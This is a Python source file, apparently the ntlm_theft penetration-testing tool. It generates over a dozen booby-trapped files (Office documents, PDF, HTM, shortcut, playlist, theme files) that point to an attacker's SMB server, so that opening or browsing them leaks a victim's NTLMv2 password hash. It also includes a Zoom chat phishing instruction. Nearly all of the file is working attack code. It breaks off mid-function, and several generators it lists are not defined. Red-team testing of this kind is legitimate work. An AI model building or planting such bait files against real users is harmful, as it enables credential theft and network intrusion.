#!/usr/bin/env python3

"""
ntlm_theft - Generate files for NTLMv2 hash theft attacks.

A tool for generating multiple types of NTLMv2 hash theft files for
authorized penetration testing and red team engagements.

Author: Jacob Wilkin (Greenwolf)
License: GPL-3.0
"""

# Tested on Windows 10 1903 Build 18362.720
# Working Attacks:
# Browse to directory: .url
# Open file: .xml, .rtf, .jnlp, .xml (includePicture), .asx, .docx (includePicture),
#            .docx (remoteTemplate), .docx (via Frameset), .xlsx (via External Cell),
#            .htm (Open locally with Chrome, IE or Edge)
# Open file and allow: pdf
# Browser download and open: .application (Must be downloaded via a web browser and run)
# Partial Open file: .m3u (Works if you open with windows media player,
#                    but windows 10 auto opens with groove music)

# In progress - desktop.ini (Need to test older windows versions),
#               autorun.inf (Need to test before windows 7),
#               scf (Need to test on older windows)

# References
# https://ired.team/offensive-security/initial-access/t1187-forced-authentication
# https://www.securify.nl/blog/SFY20180501/living-off-the-land_-stealing-netntlm-hashes.html
# https://ired.team/offensive-security/initial-access/phishing-with-ms-office/inject-macros-from-a-remote-dotm-template-docx-with-macros
# https://pentestlab.blog/2017/12/18/microsoft-office-ntlm-hashes-via-frameset/
# https://github.com/deepzec/Bad-Pdf/blob/master/badpdf.py
# https://github.com/rocketscientist911/excel-ntlmv2
# https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/#comments
# https://www.youtube.com/watch?v=PDpBEY1roRc
# https://web.archive.org/web/20190106181024/https://hyp3rlinx.altervista.org/advisories/MICROSOFT-WINDOWS-.LIBRARY-MS-FILETYPE-INFORMATION-DISCLOSURE.txt

import argparse
import base64
import os
import re
import shutil
import sys
import tempfile
import zipfile

# Third-party imports
import xlsxwriter

# Script directory for template access
SCRIPT_DIRECTORY = os.path.dirname(os.path.abspath(__file__))

# Version
__version__ = "0.2.0"


GENERATORS = {
    "scf": {
        "description": "Shell Command File with remote icon",
        "action": "BROWSE TO FOLDER",
        "modern": False,
        "files": [(".scf", "create_scf")],
    },
    "url": {
        "description": "Internet Shortcut with URL/icon fields",
        "action": "BROWSE TO FOLDER",
        "modern": True,
        "files": [("-(url).url", "create_url_url"), ("-(icon).url", "create_url_icon")],
    },
    "lnk": {
        "description": "Windows Shortcut with remote icon",
        "action": "BROWSE TO FOLDER",
        "modern": True,
        "files": [(".lnk", "create_lnk")],
    },
    "rtf": {
        "description": "Rich Text Format with INCLUDEPICTURE",
        "action": "OPEN",
        "modern": True,
        "files": [(".rtf", "create_rtf")],
    },
    "xml": {
        "description": "Microsoft Word XML with stylesheet/includepicture",
        "action": "OPEN",
        "modern": True,
        "files": [
            ("-(stylesheet).xml", "create_xml"),
            ("-(fulldocx).xml", "create_xml_includepicture"),
        ],
    },
    "htm": {
        "description": "HTML with remote image and handler",
        "action": "OPEN FROM DESKTOP WITH CHROME, IE OR EDGE",
        "modern": True,
        "files": [(".htm", "create_htm"), ("-(handler).htm", "create_htm_handler")],
    },
    "docx": {
        "description": "Word document with includepicture/template/frameset",
        "action": "OPEN",
        "modern": True,
        "files": [
            ("-(includepicture).docx", "create_docx_includepicture"),
            ("-(remotetemplate).docx", "create_docx_remote_template"),
            ("-(frameset).docx", "create_docx_frameset"),
        ],
    },
    "xlsx": {
        "description": "Excel spreadsheet with external cell reference",
        "action": "OPEN",
        "modern": True,
        "files": [("-(externalcell).xlsx", "create_xlsx_externalcell")],
    },
    "wax": {
        "description": "Windows Media Player playlist",
        "action": "OPEN",
        "modern": True,
        "files": [(".wax", "create_wax")],
    },
    "m3u": {
        "description": "Media playlist (Windows Media Player only)",
        "action": "OPEN IN WINDOWS MEDIA PLAYER ONLY",
        "modern": True,
        "files": [(".m3u", "create_m3u")],
    },
    "asx": {
        "description": "Advanced Stream Redirector playlist",
        "action": "OPEN",
        "modern": True,
        "files": [(".asx", "create_asx")],
    },
    "jnlp": {
        "description": "Java Network Launch Protocol with remote JAR",
        "action": "OPEN",
        "modern": True,
        "files": [(".jnlp", "create_jnlp")],
    },
    "application": {
        "description": ".NET ClickOnce application manifest",
        "action": "DOWNLOAD AND OPEN",
        "modern": True,
        "files": [(".application", "create_application")],
    },
    "pdf": {
        "description": "PDF with remote GoToE action",
        "action": "OPEN AND ALLOW",
        "modern": True,
        "files": [(".pdf", "create_pdf")],
    },
    "zoom": {
        "description": "Zoom chat UNC path injection",
        "action": "PASTE TO CHAT",
        "modern": False,
        "files": [("/zoom-attack-instructions.txt", "create_zoom")],
    },
    "odt": {
        "description": "OpenDocument Text with remote image",
        "action": "OPEN IN LIBREOFFICE/OPENOFFICE",
        "modern": True,
        "files": [(".odt", "create_odt")],
    },
    "libraryms": {
        "description": "Windows Library file with remote icon",
        "action": "BROWSE TO FOLDER",
        "modern": True,
        "files": [(".library-ms", "create_libraryms")],
    },
    "autoruninf": {
        "description": "Autorun.inf with remote executable",
        "action": "BROWSE TO FOLDER",
        "modern": False,
        "files": [("/Autorun.inf", "create_autoruninf")],
    },
    "desktopini": {
        "description": "Desktop.ini with remote icon",
        "action": "BROWSE TO FOLDER",
        "modern": False,
        "files": [("/desktop.ini", "create_desktopini")],
    },
    "theme": {
        "description": "Windows Theme file with remote resources",
        "action": "INSTALL THEME",
        "modern": True,
        "files": [(".theme", "create_theme")],
    },
}


def validate_filename(filename: str) -> None:
    """Validate filename to prevent path traversal attacks."""
    if not filename:
        sys.exit("Error: Filename cannot be empty")

    # Check for path traversal
    if ".." in filename or filename.startswith("/") or filename.startswith("\\"):
        sys.exit("Error: Invalid filename - path traversal not allowed")

    # Check for invalid characters (allow alphanumeric, dash, underscore, dot)
    if not re.match(r"^[\w\-. ]+$", filename):
        sys.exit(
            "Error: Invalid filename - only alphanumeric, dash, underscore, dot, and space allowed"
        )


def validate_server(server: str) -> str:
    """Validate and sanitize server address."""
    if not server:
        sys.exit("Error: Server address cannot be empty")

    # Basic validation - allow IP addresses and hostnames
    # IPv4 pattern
    ipv4_pattern = r"^(\d{1,3}\.){3}\d{1,3}$"
    # Hostname pattern (alphanumeric, dots, dashes)
    hostname_pattern = r"^[a-zA-Z0-9]([a-zA-Z0-9\-\.]*[a-zA-Z0-9])?$"

    if not (re.match(ipv4_pattern, server) or re.match(hostname_pattern, server)):
        sys.exit(
            "Error: Invalid server address - must be IP address or valid hostname"
        )

    # Additional IPv4 validation
    if re.match(ipv4_pattern, server):
        octets = server.split(".")
        for octet in octets:
            if int(octet) > 255:
                sys.exit("Error: Invalid IP address - octet out of range")

    return server


def escape_for_xml(text: str) -> str:
    """Escape special characters for XML content."""
    text = text.replace("&", "&amp;")
    text = text.replace("<", "&lt;")
    text = text.replace(">", "&gt;")
    text = text.replace('"', "&quot;")
    text = text.replace("'", "&apos;")
    return text


def create_odt(server: str, filename: str, modern: bool = False) -> None:
    """Create ODT file with remote image reference."""
    # Base64 encoded ODT content.xml parts
    contentxml1 = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4NCjxvZmZpY2U6ZG9jdW1lbnQtY29udGVudCB4bWxuczpvZmZpY2U9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2ZmaWNlOjEuMCIgeG1sbnM6c3R5bGU9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6c3R5bGU6MS4wIiB4bWxuczp0ZXh0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnRleHQ6MS4wIiB4bWxuczp0YWJsZT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczp0YWJsZToxLjAiIHhtbG5zOmRyYXc9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6ZHJhd2luZzoxLjAiIHhtbG5zOmZvPSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnhzbC1mby1jb21wYXRpYmxlOjEuMCIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHhtbG5zOmRjPSJodHRwOi8vcHVybC5vcmcvZGMvZWxlbWVudHMvMS4xLyIgeG1sbnM6bWV0YT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczptZXRhOjEuMCIgeG1sbnM6bnVtYmVyPSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOmRhdGFzdHlsZToxLjAiIHhtbG5zOnN2Zz0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpzdmctY29tcGF0aWJsZToxLjAiIHhtbG5zOmNoYXJ0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOmNoYXJ0OjEuMCIgeG1sbnM6ZHIzZD0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpkcjNkOjEuMCIgeG1sbnM6bWF0aD0iaHR0cDovL3d3dy53My5vcmcvMTk5OC9NYXRoL01hdGhNTCIgeG1sbnM6Zm9ybT0idXJuOm9hc2lzOm5hbWVzOnRjOm9wZW5kb2N1bWVudDp4bWxuczpmb3JtOjEuMCIgeG1sbnM6c2NyaXB0PSJ1cm46b2FzaXM6bmFtZXM6dGM6b3BlbmRvY3VtZW50OnhtbG5zOnNjcmlwdDoxLjAiIHhtbG5zOm9vbz0iaHR0cDovL29wZW5vZmZpY2Uub3JnLzIwMDQvb2ZmaWNlIiB4bWxuczpvb293PSJodHRwOi8vb3Blbm9mZmljZS5vcmcvMjAwNC93cml0ZXIiIHhtbG5zOm9vb2M9Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA0L2NhbGMiIHhtbG5zOmRvbT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS94bWwtZXZlbnRzIiB4bWxuczp4Zm9ybXM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDIveGZvcm1zIiB4bWxuczp4c2Q9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hIiB4bWxuczp4c2k9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvWE1MU2NoZW1hLWluc3RhbmNlIiB4bWxuczpycHQ9Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDA1L3JlcG9ydCIgeG1sbnM6b2Y9InVybjpvYXNpczpuYW1lczp0YzpvcGVuZG9jdW1lbnQ6eG1sbnM6b2Y6MS4yIiB4bWxuczp4aHRtbD0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCIgeG1sbnM6Z3JkZGw9Imh0dHA6Ly93d3cudzMub3JnLzIwMDMvZy9kYXRhLXZpZXcjIiB4bWxuczp0YWJsZW9vbz0iaHR0cDovL29wZW5vZmZpY2Uub3JnLzIwMDkvdGFibGUiIHhtbG5zOmRyYXdvb289Imh0dHA6Ly9vcGVub2ZmaWNlLm9yZy8yMDEwL2RyYXciIHhtbG5zOmNhbGNleHQ9InVybjpvcmc6ZG9jdW1lbnRmb3VuZGF0aW9uOm5hbWVzOmV4cGVyaW1lbnRhbDpjYWxjOnhtbG5zOmNhbGNleHQ6MS4wIiB4bWxuczpsb2V4dD0idXJuOm9yZzpkb2N1bWVudGZvdW5kYXRpb246bmFtZXM6ZXhwZXJpbWVudGFsOm9mZmljZTp4bWxuczpsb2V4dDoxLjAiIHhtbG5zOmZpZWxkPSJ1cm46b3BlbmRvY3VtZW50OnhtbG5zOmZpZWxkOjEuMCIgeG1sbnM6Zm9ybXg9InVybjpvcGVuZG9jdW1lbnQ6eG1sbnM6Zm9ybToxLjAiIHhtbG5zOmNzcz1zdD0iaHR0cDovL3d3dy53My5vcmcvbnMjIiBvZmZpY2U6dmVyc2lvbj0iMS4yIj48b2ZmaWNlOmZvbnQtZmFjZS1kZWNscz48c3R5bGU6Zm9udC1mYWNlIHN0eWxlOm5hbWU9IkxpYmVyYXRpb24gU2VyaWYiIHN2Zzpmb250LWZhbWlseT0iJmFwb3M7TGliZXJhdGlvbiBTZXJpZiZhcG9zOyIgc3R5bGU6Zm9udC1mYW1pbHktZ2VuZXJpYz0icm9tYW4iIHN0eWxlOmZvbnQtcGl0Y2g9InZhcmlhYmxlIi8+PHN0eWxlOmZvbnQtZmFjZSBzdHlsZTpuYW1lPSJMaWJlcmF0aW9uIFNhbnMiIHN2Zzpmb250LWZhbWlseT0iJmFwb3M7TGliZXJhdGlvbiBTYW5zJmFwb3M7IiBzdHlsZTpmb250LWZhbWlseS1nZW5lcmljPSJzd2lzcyIgc3R5bGU6Zm9udC1waXRjaD0idmFyaWFibGUiLz48L29mZmljZTpmb250LWZhY2UtZGVjbHM+PG9mZmljZTphdXRvbWF0aWMtc3R5bGVzPjxzdHlsZTpzdHlsZSBzdHlsZTpuYW1lPSJmcjEiIHN0eWxlOmZhbWlseT0iZ3JhcGhpYyIgc3R5bGU6cGFyZW50LXN0eWxlLW5hbWU9IkdyYXBoaWNzIj48c3R5bGU6Z3JhcGhpYy1wcm9wZXJ0aWVzIHN0eWxlOnZlcnRpY2FsLXBvcz0idG9wIiBzdHlsZTp2ZXJ0aWNhbC1yZWw9ImJhc2VsaW5lIiBzdHlsZTpob3Jpem9udGFsLXBvcz0iY2VudGVyIiBzdHlsZTpob3Jpem9udGFsLXJlbD0icGFyYWdyYXBoIi8+PC9zdHlsZTpzdHlsZT48c3R5bGU6c3R5bGUgc3R5bGU6bmFtZT0iUDEiIHN0eWxlOmZhbWlseT0icGFyYWdyYXBoIiBzdHlsZTpwYXJlbnQtc3R5bGUtbmFtZT0iU3RhbmRhcmQiPjxzdHlsZTp0ZXh0LXByb3BlcnRpZXMgZm86Zm9udC1zaXplPSI0OHB0IiBzdHlsZTpmb250LXNpemUtYXNpYW49IjQ4cHQiIHN0eWxlOmZvbnQtc2l6ZS1jb21wbGV4PSI0OHB0Ii8+PC9zdHlsZTpzdHlsZT48L29mZmljZTphdXRvbWF0aWMtc3R5bGVzPjxvZmZpY2U6Ym9keT48b2ZmaWNlOnRleHQ+PHRleHQ6c2VxdWVuY2UtZGVjbHM+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJJbGx1c3RyYXRpb24iLz48dGV4dDpzZXF1ZW5jZS1kZWNsIHRleHQ6ZGlzcGxheS1vdXRsaW5lLWxldmVsPSIwIiB0ZXh0Om5hbWU9IlRhYmxlIi8+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJUZXh0Ii8+PHRleHQ6c2VxdWVuY2UtZGVjbCB0ZXh0OmRpc3BsYXktb3V0bGluZS1sZXZlbD0iMCIgdGV4dDpuYW1lPSJEcmF3aW5nIi8+PC90ZXh0OnNlcXVlbmNlLWRlY2xzPjx0ZXh0OnAgdGV4dDpzdHlsZS1uYW1lPSJQMSI+PGRyYXc6ZnJhbWUgZHJhdzpzdHlsZS1uYW1lPSJmcjEiIGRyYXc6bmFtZT0iSW1hZ2UxIiB0ZXh0OmFuY2hvci10eXBlPSJhcy1jaGFyIiBzdmc6d2lkdGg9IjEwLjA0OWNtIiBzdmc6aGVpZ2h0PSI1LjYwM2NtIiBkcmF3OnpJbmRleD0iMCI+PGRyYXc6aW1hZ2UgeGxpbms6aHJlZj0iZmlsZTovLy8v"
    contentxml3 = "L3Rlc3QuanBnIiB4bGluazp0eXBlPSJzaW1wbGUiIHhsaW5rOnNob3c9ImVtYmVkIiB4bGluazphY3R1YXRlPSJvbkxvYWQiLz48ZHJhdzppbWFnZSB4bGluazpocmVmPSIuL09iamVjdFJlcGxhY2VtZW50cy9PYmplY3QgMSIgeGxpbms6dHlwZT0ic2ltcGxlIiB4bGluazpzaG93PSJlbWJlZCIgeGxpbms6YWN0dWF0ZT0ib25Mb2FkIi8+PC9kcmF3OmZyYW1lPjwvdGV4dDpwPjwvb2ZmaWNlOnRleHQ+PC9vZmZpY2U6Ym9keT48L29mZmljZTpkb2N1bWVudC1jb250ZW50Pg=="

    # Decode and inject server
    part1 = base64.b64decode(contentxml1).decode("utf-8")
    part2 = base64.b64decode(contentxml3).decode("utf-8")
    fileout = part1 + server + part2

    # Create ODT using ezodf
    try:
        from ezodf import newdoc
    except ImportError:
        print(
            "Skipping ODT: Missing `ezodf`. Install with: pip install ezodf lxml",
            file=sys.stderr,
        )
        return

    with tempfile.TemporaryDirectory() as tmpdir:
        content_xml_path = os.path.join(tmpdir, "content.xml")
        temp_odt = os.path.join(tmpdir, "temp.odt")

        # Write content.xml
        with open(content_xml_path, "w", encoding="utf-8") as f:
            f.write(fileout)

        # Create blank ODT
        odt = newdoc(doctype="odt", filename=temp_odt)
        odt.save()

        # Rebuild ODT with malicious content.xml
        final_odt = os.path.join(tmpdir, "final.odt")
        with zipfile.ZipFile(temp_odt, "r") as zin:
            with zipfile.ZipFile(final_odt, "w") as zout:
                for item in zin.infolist():
                    if item.filename != "content.xml":
                        zout.writestr(item, zin.read(item.filename))

        with zipfile.ZipFile(final_odt, "a") as zf:
            zf.write(content_xml_path, arcname="content.xml")

        # Copy to final destination
        shutil.copy2(final_odt, filename)

    print(f"Created: {filename} (OPEN IN LIBREOFFICE/OPENOFFICE)")


def create_scf(server: str, filename: str, modern: bool = False) -> None:
    """Create SCF file with remote icon. Not working on modern Windows."""
    if modern:
        print("Skipping SCF as it does not work on modern Windows")
        return

    content = f"""[Shell]
Command=2
IconFile=\\\\{server}\\tools\\nc.ico
[Taskbar]
Command=ToggleDesktop"""

    with open(filename, "w") as f:
        f.write(content)
    print(f"Created: {filename} (BROWSE TO FOLDER)")


def create_url_url(server: str, filename: str, modern: bool = False) -> None:
    """Create URL file with remote URL field."""
    content = f"""[InternetShortcut]
URL=file://{server}/leak/leak.html"""

    with open(filename, "w") as f:
        f.write(content)
    print(f"Created: {filename} (BROWSE TO FOLDER)")


def create_url_icon(server: str, filename: str, modern: bool = False) -> None:
    """Create URL file with remote icon."""
    content = f"""[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\\\{server}\\%USERNAME%.icon
IconIndex=1"""

    with open(filename, "w") as f:
        f.write(content)
    print(f"Created: {filename} (BROWSE TO FOLDER)")


def create_rtf(server: str, filename: str, modern: bool = False) -> None:
    """Create RTF file with INCLUDEPICTURE field."""
    content = (
        f'{{\\rtf1{{\\field{{\\*\\fldinst {{INCLUDEPICTURE "file://{server}/test.jpg"'
        f" \\\\* MERGEFORMAT\\\\d}}}}{{\\fldrslt}}}}}}"
    )

    with open(filename, "w") as f:
        f.write(content)
    print(f"Created: {filename} (OPEN)")


def create_xml(server: str, filename: str, modern: bool = False) -> None:
    """Create XML file with remote stylesheet."""
    content = f"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<?mso-application progid="Word.Document"?>
<?xml-stylesheet type="text/xsl" href="\\\\{server}\\bad.xsl" ?>"""

    with open(filename, "w") as f:
        f.write(content)
    print(f"Created: {filename} (OPEN)")


def create_xml_includepicture(server: str, filename: str, modern: bool = False) -> None:
    """Create XML file with remote includepicture field."""
    template_path = os.path.join(
        SCRIPT_DIRECTORY, "templates", "includepicture-template.xml"
    )

    with open(template_path, "r", encoding="utf-8") as f:
        filedata = f.read()

    filedata = filedata.replace("127.0.0.1", server)

    with open(filename, "w", encoding="utf-8") as f:
        f.write(filedata)
    print(f"Created: {filename} (OPEN)")


def create_htm(server: str, filename: str, modern: bool = False) -> None:
    """Create HTML file with remote image."""
    content = f"""<!DOCTYPE html>
<html>
   <img src="file://{server}/leak/leak.png"/>
</html>"""

    with open(filename, "w") as f:
        f.write(content)
    print(f"Created: {filename} (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")


def create_htm_handler(server: str, filename: str, modern: bool = False) -> None:
    """Create HTML file with ms-word handler."""
    content = f"""<!DOCTYPE html>
<html>
    <script>
        location.href = 'ms-word:ofe|u|\\\\{server}\\leak\\leak.docx';
    </script>
</html>"""

    with open(filename, "w") as f:
        f.write(content)
    print(f"Created: {filename} (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)")


def create_docx_includepicture(
    server: str, filename: str, modern: bool = False
) -> None:
    """Create DOCX file with remote includepicture field."""
    src = os.path.join(SCRIPT_DIRECTORY, "templates", "docx-includepicture-template")

    with tempfile.TemporaryDirectory() as tmpdir:
        dest = os.path.join(tmpdir, "docx-includepicture-template")
        shutil.copytree(src, dest)

        rels_file = os.path.join(dest, "word", "_rels", "document.xml.rels")
        with open(rels_file, encoding="utf-8") as f:
            filedata = f.read()

        filedata = filedata.replace("127.0.0.1", server)

        with open(rels_file, "w", encoding="utf-8") as f:
            f.write(filedata)

        archive_base = os.path.join(tmpdir, "output")
        shutil.make_archive(archive_base, "zip", dest)
        shutil.move(archive_base + ".zip", filename)

    print(f"Created: {filename} (OPEN)")


def create_docx_remote_template(
    server: str, filename: str, modern: bool = False
) -> None:
    """Create DOCX file with remote template."""
    src = os.path.join(SCRIPT_DIRECTORY, "templates", "docx-remotetemplate-template")

    with tempfile.TemporaryDirectory() as tmpdir:
        dest = os.path.join(tmpdir, "docx-remotetemplate-template")
        shutil.copytree(src, dest)

        rels_file = os.path.join(dest, "word", "_rels", "settings.xml.rels")
        with open(rels_file, encoding="utf-8") as f:
            filedata = f.read()

        filedata = filedata.replace("127.0.0.1", server)

        with open(rels_file, "w", encoding="utf-8") as f:
            f.write(filedata)

        archive_base = os.path.join(tmpdir, "output")
        shutil.make_archive(archive_base, "zip", dest)
        shutil.move(archive_base + ".zip", filename)

    print(f"Created: {filename} (OPEN)")


def create_docx_frameset(server: str, filename: str, modern: bool = False) -> None:
    """Create DOCX file with frameset attack."""
    src = os.path.join(SCRIPT_DIRECTORY, "templates", "docx-frameset-template")

    with tempfile.TemporaryDirectory() as tmpdir:
        dest = os.path.join(tmpdir, "docx-frameset-template")
        shutil.copytree(src, dest)

        rels_file = os.path.join(dest, "word", "_rels", "webSettings.xml.rels")
        with open(rels_file, encoding="utf-8") as f:
            filedata = f.read()

        filedata = filedata.replace("127.0.0.1", server)

        with open(rels_file, "w", encoding="utf-8") as f:
            f.write(filedata)

        archive_base = os.path.join(tmpdir, "output")
        shutil.make_archive(archive_base, "zip", dest)
        shutil.move(archive_base + ".zip", filename)

    print(f"Created: {filename} (OPEN)")


def create_xlsx_externalcell(server: str, filename: str, modern: bool = False) -> None:
    """Create XLSX file with external cell reference."""
    workbook = xlsxwriter.Workbook(filename)
    worksheet = workbook.add_worksheet()
    worksheet.write_url(
        "AZ1",
        f"external://{server}\\share\\[Workbookname.xlsx]SheetName'!$B$2:$C$62,2,FALSE)",
    )
    workbook.close()
    print(f"Created: {filename} (OPEN)")


def create_wax(server: str, filename: str, modern: bool = False) -> None:
    """Create WAX playlist file."""
    content = f"""https://{server}/test
file://\\\\{server}/steal/file"""

    with open(filename, "w") as f:
        f.write(content)
    print(f"Created: {filename} (OPEN)")


def create_m3u(server: str, filename: str, modern: bool = False) -> None:
    """Create M3U playlist file."""
    content = f"""#EXTM3U
#EXTINF:1337, Leak
\\\\{server}\\leak.mp3"""

    with open(filename, "w") as f:
        f.write(content)
    print(f"Created: {filename} (OPEN IN WINDOWS MEDIA PLAYER ONLY)")


def create_asx(server: str, filename: str, modern: bool = False) -> None:
    """Create ASX playlist file."""
    content = f"""<asx version="3.0">
   <title>Leak</title>
   <entry>
      <title></title>
      <ref href="file://{server}/leak/leak.wma"/>
   </entry>
</asx>"""

    with open(filename, "w") as f:
        f.write(content)
    print(f"Created: {filename} (OPEN)")


def create_jnlp(server: str, filename: str, modern: bool = False) -> None:
    """Create JNLP file with remote JAR."""
    content = f"""<?xml version="1.0" encoding="UTF-8"?>
<jnlp spec="1.0+" codebase="" href="">
   <resources>
      <jar href="file://{server}/leak/leak.jar"/>
   </resources>
   <application-desc/>
</jnlp>"""

    with open(filename, "w") as f:
        f.write(content)
    print(f"Created: {filename} (OPEN)")


def create_application(server: str, filename: str, modern: bool = False) -> None:
    """Create .NET ClickOnce application manifest."""
    content = f"""<?xml version="1.0" encoding="utf-8"?>
<asmv1:assembly xsi:schemaLocation="urn:schemas-microsoft-com:asm.v1 assembly.adaptive.xsd" manifestVersion="1.0" xmlns:dsig="http://www.w3.org/2000/09/xmldsig#" xmlns="urn:schemas-microsoft-com:asm.v2" xmlns:asmv1="urn:schemas-microsoft-com:asm.v1" xmlns:asmv2="urn:schemas-microsoft-com:asm.v2" xmlns:xrml="urn:mpeg:mpeg21:2003:01-REL-R-NS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
   <assemblyIdentity name="Leak.app" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" xmlns="urn:schemas-microsoft-com:asm.v1" />
   <description asmv2:publisher="Leak" asmv2:product="Leak" asmv2:supportUrl="" xmlns="urn:schemas-microsoft-com:asm.v1" />
   <deployment install="false" mapFileExtensions="true" trustURLParameters="true" />
   <dependency>
      <dependentAssembly dependencyType="install" codebase="file://{server}/leak/Leak.exe.manifest" size="32909">
         <assemblyIdentity name="Leak.exe" version="1.0.0.0" publicKeyToken="0000000000000000" language="neutral" processorArchitecture="x86" type="win32" />
         <hash>
            <dsig:Transforms>
               <dsig:Transform Algorithm="urn:schemas-microsoft-com:HashTransforms.Identity" />
            </dsig:Transforms>
            <dsig:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1" />
            <dsig:DigestValue>ESZ11736AFIJnp6lKpFYCgjw4dU=</dsig:DigestValue>
         </hash>
      </dependentAssembly>
   </dependency>
</asmv1:assembly>"""

    with open(filename, "w") as f:
        f.write(content)
    print(f"Created: {filename} (DOWNLOAD AND OPEN)")


def create_pdf(server: str, filename: str, modern: bool = False) -> None:
    """Create PDF file with remote GoToE action."""
    content = f"""%PDF-1.7
1 0 obj
<</Type/Catalog/Pages 2 0 R>>
endobj
2 0 obj
<</Type/Pages/Kids[3 0 R]/Count 1>>
endobj
3 0 obj
<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Resources<<>>>>
endobj
xref
0 4
0000000000 65535 f
0000000015 00000 n
0000000060 00000 n
0000000111 00000 n
trailer
<</Size 4/Root 1 0 R>>
startxref
190
3 0 obj
<< /Type /Page
   /Contents 4 0 R
   /AA <<
       /O <<
          /F (\\\\\\\\{server}\\\\test)
          /D [ 0 /Fit]
          /S /GoToE
          >>
       >>
       /Parent 2 0 R
       /Resources <<
            /Font <<
                /F1 <<
                    /Type /Font
                    /Subtype /Type1
                    /BaseFont /Helvetica
                    >>
                  >>
                >>
>>
endobj
4 0 obj<< /Length 100>>
stream
BT
/TI_0 1 Tf
14 0 0 14 10.000 753.976 Tm
0.0 0.0 0.0 rg
(PDF Document) Tj
ET
endstream
endobj
trailer
<<
    /Root 1 0 R
>>
%%EOF"""

    with open(filename, "w") as f:
        f.write(content)
    print(f"Created: {filename} (OPEN AND ALLOW)")


def create_zoom(server: str, filename: str, modern: bool = False) -> None:
    """Create Zoom chat attack instructions. Not working on latest versions."""
    if modern:
        print("Skipping Zoom as it does not work on the latest versions")
        return

    content = f"""To attack zoom, just put the following link along with your phishing message in the chat window:

\\\\{server}\\xyz
"""

    with open(filename, "w") as f:
        f.write(content)
    print(f"Created: {filename} (PASTE TO CHAT)")


def create_theme(server: str, filename: str, modern: bool = False) -> None:
    """Create Windows Theme file with remote resources."""
    content = f"""[Theme]
; Windows - IDS_THEME_DISPLAYNAME_AERO_LIGHT
DisplayName=\\{server} Theme
SetLogonBackground=0
; Computer - SHIDI_SERVER
[CLSID\\{{20D04FE0-3AEA-1069-A2D8-08002B30309D}}\\DefaultIcon]
DefaultValue=\\\\{server}\\setup.exe,-109

; UsersFiles - SHIDI_USERFILES
[CLSID\\{{59031A47-3F72-44A7-89C5-5595FE6B30EE}}\\DefaultIcon]
DefaultValue=\\\\{server}\\setup.exe,-123

; Network - SHIDI_MYNETWORK
[CLSID\\{{F02C1A0D-BE21-4350-88B0-7367FC96EF3C}}\\DefaultIcon]
DefaultValue=\\\\{server}\\setup.exe,-25

; Recycle Bin - SHIDI_RECYCLERFULL SHIDI_RECYCLER
[CLSID\\{{645FF040-5081-101B-9F08-00AA002F954E}}\\DefaultIcon]
Full=\\\\{server}\\setup.exe,-54
Empty=\\\\{server}\\setup.exe,-55

[Control Panel\\Cursors]
AppStarting=\\\\{server}\\setup.exe
Arrow=\\\\{server}\\aero_arrow.cur
Crosshair=
Hand=\\\\{server}\\aero_link.cur
Help=\\\\{server}\\aero_helpsel.cur
IBeam=
No=\\\\{server}\\aero_unavail.cur
NWPen=\\\\{server}\\aero_pen.cur
SizeAll=\\\\{server}\\aero_move.cur
SizeNESW=\\\\{server}\\aero_nesw.cur
SizeNS=\\\\{server}\\aero_ns.cur
SizeNWSE=\\\\{server}\\aero_nwse.cur
SizeWE=\\\\{server}\\aero_ew.cur
UpArrow=\\\\{server}\\aero_up.cur
Wait=\\\\{server}\\aero_busy.ani
DefaultValue=Windows Default
DefaultValue.MUI=@main.cpl,-1020

[Control Panel\\Desktop]
Wallpaper=\\\\{server}\\setup.exe
TileWallpaper=0
WallpaperStyle=10
Pattern=
MultimonBackgrounds=0

[VisualStyles]
Path=\\\\{server}\\Themes\\Aero\\Aero.msstyles
ColorStyle=NormalColor
Size=NormalSize
AutoColorization=0
ColorizationColor=0XC40078D4
SystemMode=Light
AppMode=Light

[boot]
SCRNSAVE.EXE=

[MasterThemeSelector]
MTSM=RJSPBS

[Sounds]
; IDS_SCHEME_DEFAULT
SchemeName=@\\\\{server}\\setup.dll,-800
        """

